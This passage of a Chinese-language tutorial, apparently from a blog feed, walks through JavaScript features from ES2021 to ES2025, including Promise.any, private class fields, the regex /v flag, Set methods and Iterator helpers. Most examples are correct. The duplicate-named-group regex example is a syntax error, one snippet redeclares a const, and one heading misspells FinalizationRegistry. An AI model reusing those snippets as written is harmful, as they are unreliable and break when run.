<ul>
<li>iterable：Promise 数组或其他可迭代对象。</li>
</ul>
</li>
<li>
<p><strong>示例</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> promises = [
  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'Error 1'</span>),
  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'Success'</span>),
  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'Error 2'</span>)
];
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">any</span>(promises)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value)) <span class="hljs-comment">// 'Success'（第一个 resolved）</span>
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error)); <span class="hljs-comment">// 如果全 reject：AggregateError</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-11">WeakRefs和FinalizersRegistry:</h3>
<ul>
<li>WeakRefs 用于引用对象而不阻止垃圾回收</li>
<li>FinalizersRegistry 用于缓存或观察对象，而不干扰内存管理；FinalizationRegistry 提供清理回调，但不保证时序。</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> obj = { <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span> };
<span class="hljs-keyword">const</span> weak = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakRef</span>(obj);

<span class="hljs-keyword">const</span> registry = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FinalizationRegistry</span>(<span class="hljs-function"><span class="hljs-params">heldValue</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Object with <span class="hljs-subst">${heldValue}</span> cleaned up`</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(weak.<span class="hljs-title function_">deref</span>());<span class="hljs-comment">//undefined</span>
});
registry.<span class="hljs-title function_">register</span>(obj, <span class="hljs-string">'Alice'</span>);
obj = <span class="hljs-literal">null</span>; <span class="hljs-comment">// GC 时调用 callback</span>
</code></pre>
<hr/>
<h2 data-id="heading-12">ES2022</h2>
<h3 data-id="heading-13">Top-level await：</h3>
<p>可以直接在模块最外层使用 <code>await</code></p>
<h3 data-id="heading-14">Class的私有/静态成员和方法</h3>
<p>增加了<code>#</code>标识私有，<code>static</code>标识静态（现在都用ts了，这两个特性很少用到）</p>
<pre><code class="hljs language-js" lang="js"> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
  #value = <span class="hljs-number">0</span>;

  #<span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.#value++;
  }

  get #<span class="hljs-title function_">count</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.#value;
  }

  <span class="hljs-title function_">add</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.#<span class="hljs-title function_">increment</span>();
  }

  <span class="hljs-title function_">getValue</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.#count;
  }
}

<span class="hljs-keyword">const</span> c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
c.<span class="hljs-title function_">add</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c.<span class="hljs-title function_">getValue</span>()); <span class="hljs-comment">// 1</span>
<span class="hljs-comment">// c.#increment(); // SyntaxError,不过控制台访问不会报错</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MathUtils</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14159</span>;
  <span class="hljs-keyword">static</span> #secret = <span class="hljs-number">42</span>;

  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getPi</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">PI</span>;
  }

  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getSecret</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.#secret;
  }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtils</span>.<span class="hljs-property">PI</span>); <span class="hljs-comment">// 3.14159</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtils</span>.<span class="hljs-title function_">getSecret</span>()); <span class="hljs-comment">// 42</span>
</code></pre>
<h3 data-id="heading-15">Error.cause:</h3>
<p>在 Error 对象中添加 cause 属性，用于链式记录错误上下文，方便调试。</p>
<pre><code class="hljs language-js" lang="js"> <span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Original issue'</span>);
} <span class="hljs-keyword">catch</span> (err) {
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Failed operation'</span>, { <span class="hljs-attr">cause</span>: err });
}
<span class="hljs-comment">// 结果错误：Failed operation (cause: Original issue)</span>
</code></pre>
<h3 data-id="heading-16">at方法:</h3>
<p>新增访问索引方法，可用于数组、字符串和 TypedArray</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">at</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// 2</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">at</span>(-<span class="hljs-number">1</span>)); <span class="hljs-comment">// 3（最后一个元素，极力推荐这种写法）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello'</span>.<span class="hljs-title function_">at</span>(-<span class="hljs-number">2</span>)); <span class="hljs-comment">// 'l'</span>
</code></pre>
<h3 data-id="heading-17">Object.hasOwn()：</h3>
<p>代替Object.prototype.hasOwnProperty.call()</p>
<h3 data-id="heading-18">正则表达式的/d标志：</h3>
<p>可用/d标志获取匹配范围</p>
<pre><code class="hljs language-js" lang="js">    <span class="hljs-keyword">const</span> match = <span class="hljs-string">'hello world'</span>.<span class="hljs-title function_">matchAll</span>(<span class="hljs-regexp">/(hello)/</span>dg);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> m <span class="hljs-keyword">of</span> match) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(m.<span class="hljs-property">indices</span>[<span class="hljs-number">0</span>]); <span class="hljs-comment">// [0, 5] 对于 'hello'</span>
    }
</code></pre>
<hr/>
<h2 data-id="heading-19">ES2023</h2>
<h3 data-id="heading-20">Array 和 TypedArray的末尾查找</h3>
<p>新增findLast() / findLastIndex()</p>
<h3 data-id="heading-21">通过拷贝修改数组(不改变原数组)</h3>
<p>新增 toSorted() / toReversed() / toSpliced() / with()</p>
<ul>
<li>
<p><strong>语法</strong>：</p>
<ul>
<li>array.toReversed()：返回反转拷贝。</li>
<li>array.toSorted(compareFn)：返回排序拷贝。</li>
<li>array.toSpliced(start, deleteCount, ...items)：返回拼接拷贝。</li>
<li>array.with(index, value)：返回替换指定索引值的拷贝。</li>
</ul>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">toSorted</span>()); <span class="hljs-comment">// [1, 2, 3]（原 arr 不变）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">toReversed</span>()); <span class="hljs-comment">// [2, 3, 1]</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">toSpliced</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>)); <span class="hljs-comment">// [1, 4, 2]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">with</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>)); <span class="hljs-comment">// [5, 3, 2]</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-22">Hashbang 语法</h3>
<p>允许在 ECMAScript 文件开头使用 #!（shebang）注释，指示解释器执行脚本。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-meta">#!/usr/bin/env node</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Hello from Node.js'</span>);
</code></pre>
<h3 data-id="heading-23">允许 <strong>Symbols</strong> 用作 WeakMap、WeakSet 的键</h3>
<p>此前key仅支持对象</p>
<hr/>
<h2 data-id="heading-24">ES2024</h2>
<h3 data-id="heading-25">Promise.withResolvers()</h3>
<p>同时创建 Promise 及其 resolve 和 reject 函数，便于手动控制 Promise 的状态。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> { promise, resolve, reject } = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">withResolvers</span>();

<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'Success'</span>), <span class="hljs-number">1000</span>);

promise.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value)); <span class="hljs-comment">// 'Success'</span>
</code></pre>
<h3 data-id="heading-26">Object.groupBy() 和 Map.groupBy()</h3>
<p>静态方法，用于根据回调函数返回的值对可迭代对象进行分组，返回一个对象（Object.groupBy）或 Map（Map.groupBy）。</p>
<ul>
<li>
<p><strong>语法</strong>：</p>
<ul>
<li>Object.groupBy(iterable, callback)</li>
<li>Map.groupBy(iterable, callback)</li>
</ul>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> items = [
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'apple'</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">'fruit'</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'carrot'</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">'vegetable'</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'banana'</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">'fruit'</span> }
];

<span class="hljs-keyword">const</span> grouped = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">groupBy</span>(items, <span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">type</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(grouped); <span class="hljs-comment">// { fruit: [{...}, {...}], vegetable: [{...}] }</span>

<span class="hljs-keyword">const</span> groupedMap = <span class="hljs-title class_">Map</span>.<span class="hljs-title function_">groupBy</span>(items, <span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">type</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(groupedMap.<span class="hljs-title function_">get</span>(<span class="hljs-string">'fruit'</span>)); <span class="hljs-comment">// [{...}, {...}]</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-27">正则表达式/v标志</h3>
<p>新标志 /v 启用 Unicode 集模式，支持属性的组合、范围、否定、交集 / 并集运算</p>
<p>在 <code>/v</code> 标志出现前，JS 正则有 <code>/u</code> 标志支持<strong>基础 Unicode 属性转义</strong>（如 <code>\p{Letter}</code> 匹配字母），但只能匹配 “单一属性”，无法直接表达 “属性的组合 / 范围 / 否定”，而 <code>/v</code> 标志正是为了解决这个问题，提供<strong>扩展 Unicode 属性转义</strong>能力。</p>
<ul>
<li>
<p><strong>语法</strong>：/pattern/v</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/[\p{Emoji}&amp;&amp;\p{Emoji_Presentation}]/</span>v;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(regex.<span class="hljs-title function_">test</span>(<span class="hljs-string">'😀'</span>)); <span class="hljs-comment">// true（Emoji）</span>

<span class="hljs-comment">// 集操作示例</span>
<span class="hljs-keyword">const</span> setDiff = <span class="hljs-regexp">/[a-z--[aeiou]]/</span>v; <span class="hljs-comment">// 辅音</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(setDiff.<span class="hljs-title function_">test</span>(<span class="hljs-string">'b'</span>)); <span class="hljs-comment">// true</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-28">Atomics.waitAsync()</h3>
<p>共享内存的异步等待方法，返回一个 Promise，在共享值变化时解决。</p>
<ul>
<li>
<p><strong>语法</strong>：Atomics.waitAsync(array, index, value, timeout)</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> sab = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedArrayBuffer</span>(<span class="hljs-number">16</span>);
<span class="hljs-keyword">const</span> int32 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Int32Array</span>(sab);

<span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Atomics</span>.<span class="hljs-title function_">waitAsync</span>(int32, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
result.<span class="hljs-property">value</span>.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Woken up'</span>));
<span class="hljs-comment">// 其他线程：Atomics.store(int32, 0, 1); Atomics.notify(int32, 0);</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-29">ArrayBuffer 和 SharedArrayBuffer 的resize和transfer</h3>
<ul>
<li>
<p><strong>语法</strong>：</p>
<ul>
<li>buffer.resize(newLength)</li>
<li>buffer.transfer(newLength)：返回新缓冲区，旧的被分离。</li>
<li>类似方法可用于 SharedArrayBuffer。</li>
</ul>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">8</span>, { <span class="hljs-attr">maxByteLength</span>: <span class="hljs-number">16</span> });
buffer.<span class="hljs-title function_">resize</span>(<span class="hljs-number">16</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(buffer.<span class="hljs-property">byteLength</span>); <span class="hljs-comment">// 16</span>

<span class="hljs-keyword">const</span> transferred = buffer.<span class="hljs-title function_">transfer</span>();
<span class="hljs-comment">// 原 buffer 被分离，无法使用</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-30">String.prototype.isWellFormed() 和 toWellFormed()</h3>
<p>这两个api用于"<strong>格式不良</strong>"字符串.</p>
<p>JavaScript 字符串基于 UTF-16 编码，其中<strong>单独的代理对字符（未配对的高 / 低代理项）</strong> 属于 “格式不良” 的字符串（也叫 “畸形 UTF-16 字符串”）。</p>
<p>高代理项范围：<code>0xD800</code> - <code>0xDBFF</code></p>
<p>低代理项范围：<code>0xDC00</code> - <code>0xDFFF</code>只有高 + 低代理项配对才是合法的 UTF-16 字符，单独出现其中一个就是 “格式不良”。</p>
<pre><code class="hljs language-js" lang="js">   <span class="hljs-comment">// 1. 格式良好的字符串（正常字符、合法代理对）</span>
   <span class="hljs-keyword">const</span> validStr1 = <span class="hljs-string">'Hello 世界'</span>;
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(validStr1.<span class="hljs-title function_">isWellFormed</span>()); <span class="hljs-comment">// true</span>

   <span class="hljs-keyword">const</span> validStr2 = <span class="hljs-string">'\uD83D\uDE00'</span>; <span class="hljs-comment">// 😀（合法的高+低代理对）</span>
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(validStr2.<span class="hljs-title function_">isWellFormed</span>()); <span class="hljs-comment">// true</span>

   <span class="hljs-comment">// 2. 格式不良的字符串（单独的高代理项/低代理项）</span>
   <span class="hljs-keyword">const</span> invalidStr1 = <span class="hljs-string">'\uD83D'</span>; <span class="hljs-comment">// 单独的高代理项（无对应低代理项）</span>
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(invalidStr1.<span class="hljs-title function_">isWellFormed</span>()); <span class="hljs-comment">// false</span>

   <span class="hljs-keyword">const</span> invalidStr2 = <span class="hljs-string">'测试\uDC00'</span>; <span class="hljs-comment">// 单独的低代理项（无对应高代理项）</span>
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(invalidStr2.<span class="hljs-title function_">isWellFormed</span>()); <span class="hljs-comment">// false</span>

   <span class="hljs-comment">// 3. 格式良好的字符串：返回原字符串副本</span>
   <span class="hljs-keyword">const</span> validStr = <span class="hljs-string">'Hello 😀'</span>;
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(validStr.<span class="hljs-title function_">toWellFormed</span>()); <span class="hljs-comment">// Hello 😀</span>
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(validStr.<span class="hljs-title function_">toWellFormed</span>() === validStr); <span class="hljs-comment">// true（内容相同，引用不同）</span>

   <span class="hljs-comment">// 4. 格式不良的字符串：替换未配对代理项为 �</span>
   <span class="hljs-keyword">const</span> invalidStr1 = <span class="hljs-string">'\uD83D'</span>; <span class="hljs-comment">// 单独高代理项</span>
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(invalidStr1.<span class="hljs-title function_">toWellFormed</span>()); <span class="hljs-comment">// �</span>
</code></pre>
<hr/>
<h2 data-id="heading-31">ES2025</h2>
<h3 data-id="heading-32">迭代器助手方法（Iterator Helpers）</h3>
<p>引入 Iterator 全局对象及其原型方法，支持对任何可迭代对象（如 Array、Set、Map）进行函数式操作，如 map、filter 等。这些方法返回新的迭代器，支持惰性求值。</p>
<ul>
<li>
<p><strong>语法</strong>：Iterator.from(iterable).method(callback)</p>
<ul>
<li>支持方法：map()、filter()、reduce()、take()、drop()、flatMap()、toArray()、forEach() 等。</li>
</ul>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>];
<span class="hljs-keyword">const</span> evenSquares = <span class="hljs-title class_">Iterator</span>.<span class="hljs-title function_">from</span>(arr)
  .<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>)
  .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x ** <span class="hljs-number">2</span>)
  .<span class="hljs-title function_">toArray</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(evenSquares); <span class="hljs-comment">// [4, 16]</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-33">Set新增方法</h3>
<p>为 Set.prototype 添加数学集合操作方法，支持集合的并集、交集、差集等。</p>
<ul>
<li>
<p><strong>新增方法</strong>：</p>
<ul>
<li>set.union(other) 并集</li>
<li>set.intersection(other) 交集</li>
<li>set.difference(other) 差集</li>
<li>set.symmetricDifference(other) 对称差集（并集减交集）</li>
<li>set.isSubsetOf(other) 子集</li>
<li>set.isSupersetOf(other) 超集</li>
<li>set.isDisjointFrom(other) 不相交</li>
</ul>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> setA = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);
<span class="hljs-keyword">const</span> setB = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(setA.<span class="hljs-title function_">union</span>(setB)); <span class="hljs-comment">// Set {1, 2, 3, 4}</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(setA.<span class="hljs-title function_">intersection</span>(setB)); <span class="hljs-comment">// Set {2, 3}</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(setA.<span class="hljs-title function_">isSubsetOf</span>(setB)); <span class="hljs-comment">// false</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-34">直接导入JSON 模块</h3>
<p>引入导入属性（with 关键字），支持直接导入 JSON 文件作为模块。</p>
<ul>
<li>
<p><strong>语法</strong>：import json from "./data.json" with { type: "json" };</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> data <span class="hljs-keyword">from</span> <span class="hljs-string">"./config.json"</span> <span class="hljs-keyword">with</span> { <span class="hljs-attr">type</span>: <span class="hljs-string">"json"</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data); <span class="hljs-comment">// { key: "value" }</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-35">Promise.try()</h3>
<p>一个新的静态方法，用于包装函数调用，确保返回 Promise，无论函数是否异步或抛出错误。</p>
<ul>
<li>
<p><strong>语法</strong>：Promise.try(callback)</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.5</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Fail'</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-string">'Success'</span>;
})
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">result</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result))
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error));
</code></pre>
</li>
</ul>
<h3 data-id="heading-36">新增Float16Array</h3>
<p>引入 Float16Array 类型数组，支持 16 位浮点数，以及 DataView 的 getFloat16/setFloat16 和 Math.f16round()。</p>
<h3 data-id="heading-37"><strong>RegExp.escape() 方法</strong></h3>
<p>一个静态方法，用于转义字符串，使其可安全用于正则表达式。</p>
<ul>
<li>
<p><strong>语法</strong>：RegExp.escape(str)</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> userInput = <span class="hljs-string">'a.b*c?'</span>;
<span class="hljs-keyword">const</span> regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-title class_">RegExp</span>.<span class="hljs-built_in">escape</span>(userInput), <span class="hljs-string">'g'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'a.b*c?'</span>.<span class="hljs-title function_">replace</span>(regex, <span class="hljs-string">'replaced'</span>)); <span class="hljs-comment">// 'replaced'</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-38">正则表达式内联标志</h3>
<ul>
<li>
<p><strong>语法</strong>：/(?i:case-insensitive)/</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/(?i:hello)/</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(regex.<span class="hljs-title function_">test</span>(<span class="hljs-string">'HELLO'</span>)); <span class="hljs-comment">// true（忽略大小写）</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-39">正则表达式重复命名捕获组</h3>
<p>允许在正则表达式中重复使用相同的命名捕获组名称。</p>
<ul>
<li>
<p><strong>语法</strong>：/(?&lt;group&gt;a)|(?&lt;group&gt;b)/</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/(?&lt;year&gt;\d{4})-(?&lt;month&gt;\d{2})|(?&lt;year&gt;\d{4})/</span>(?&lt;month&gt;\d{<span class="hljs-number">2</span>})/;
<span class="hljs-keyword">const</span> match = <span class="hljs-string">'2025-07'</span>.<span class="hljs-title function_">match</span>(regex);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(match.<span class="hljs-property">groups</span>.<span class="hljs-property">year</span>); <span class="hljs-comment">// '2025'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(match.<span class="hljs-property">groups</span>.<span class="hljs-property">month</span>); <span class="hljs-comment">// '07'</span>
</code></pre>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[阿里云 EMR Serverless Spark TPC-DS 100T 榜首背后的内核技术]]></title>    <link>https://juejin.cn/post/7605625595570569231</link>    <guid>https://juejin.cn/post/7605625595570569231</guid>    <pubDate>2026-02-13T02:58:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605625595570569231" data-draft-id="7605810996125040674" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="阿里云 EMR Serverless Spark TPC-DS 100T 榜首背后的内核技术"/> <meta itemprop="keywords" content="Spark"/> <meta itemprop="datePublished" content="2026-02-13T02:58:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿里云大数据AI技术"/> <meta itemprop="url" content="https://juejin.cn/user/2414974667341287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            阿里云 EMR Serverless Spark TPC-DS 100T 榜首背后的内核技术
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2414974667341287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿里云大数据AI技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:58:56.000Z" title="Fri Feb 13 2026 02:58:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
